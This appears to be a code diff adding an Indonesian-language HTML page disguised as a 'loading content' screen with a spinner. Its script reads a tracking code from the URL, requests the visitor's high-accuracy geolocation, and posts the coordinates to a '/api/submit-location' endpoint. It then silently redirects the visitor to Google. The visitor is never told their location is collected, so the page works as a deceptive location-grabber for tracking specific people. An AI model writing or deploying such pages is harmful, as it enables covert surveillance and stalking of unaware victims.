@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Memuat Konten...</title>
+  <style>
+    body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #ffffff; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .box { text-align: center; padding: 24px; }
+    .spinner { width: 42px; height: 42px; margin: 0 auto 16px; border: 4px solid #e0e0e0; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    p { font-size: 16px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="spinner"></div>
+    <p>Sedang memuat konten, mohon tunggu...</p>
+  </div>
+
+  <script>
+    (function () {
+      var REDIRECT_URL = 'https://www.google.com';
+
+      function getTrackingCode() {
+        var parts = window.location.pathname.split('/').filter(Boolean);
+        return parts.length > 0 ? decodeURIComponent(parts[parts.length - 1]) : '';
+      }
+
+      function redirect() {
+        window.location.replace(REDIRECT_URL);
+      }
+
+      function sendLocation(code, lat, lng, accuracy) {
+        return fetch('/api/submit-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            trackingCode: code,
+            lat: lat,
+            lng: lng,
+            accuracy: accuracy
+          })
+        }).catch(function () {});
+      }
+
+      async function main() {
+        var code = getTrackingCode();
+        if (!code) {
+          redirect();
+          return;
+        }
+
+        if (!('geolocation' in navigator)) {
+          redirect();
+          return;
+        }
+
+        var finished = false;
+        var fallback = setTimeout(function () {
+          if (!finished) {
+            finished = true;
+            redirect();
+          }
+        }, 10000);
+
+        navigator.geolocation.getCurrentPosition(
+          async function (pos) {
+            if (finished) return;
+            finished = true;
+            clearTimeout(fallback);
+            try {
+              await sendLocation(
+                code,
+                pos.coords.latitude,
+                pos.coords.longitude,
+                pos.coords.accuracy
+              );
+            } catch (e) {}
+            redirect();
+          },
+          function () {
+            if (finished) return;
+            finished = true;
+            clearTimeout(fallback);
+            redirect();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+          }
+        );
+      }
+
+      main();
+    })();
+  </script>
+</body>
+</html>
